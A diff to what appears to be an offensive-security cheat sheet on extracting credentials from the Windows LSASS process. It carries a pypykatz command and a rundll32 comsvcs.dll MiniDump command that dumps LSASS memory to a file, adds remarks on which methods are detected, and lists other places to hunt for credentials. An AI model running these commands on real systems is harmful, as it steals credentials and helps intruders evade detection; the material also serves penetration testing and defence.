@@ -448,7 +448,7 @@ $ pypykatz.exe live lsa
 ```
 
 
-- Using comsvcs.dll
+- Using comsvcs.dll (Very aggressively detected)
 
 ```powershell
 $ tasklist /FI "IMAGENAME eq lsass.exe" rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
@@ -456,8 +456,9 @@ $ tasklist /FI "IMAGENAME eq lsass.exe" rundll32.exe C:\windows\System32\comsvcs
 
 
 
-- From a Linux attacking machine using impacket.
-- From a Linux attacking machine using P
+- From a Linux attacking machine using `impacket`.
+- From a Linux attacking machine using `Physmem2profit`
+
 
 > **Note :** Anything that interact with LSASS has higher chances of detection, so before trying to extract credentials from LSASS we can try to lookup other revenues e.g powershell console history, Local SAM hives, Credential Notes etc.
 
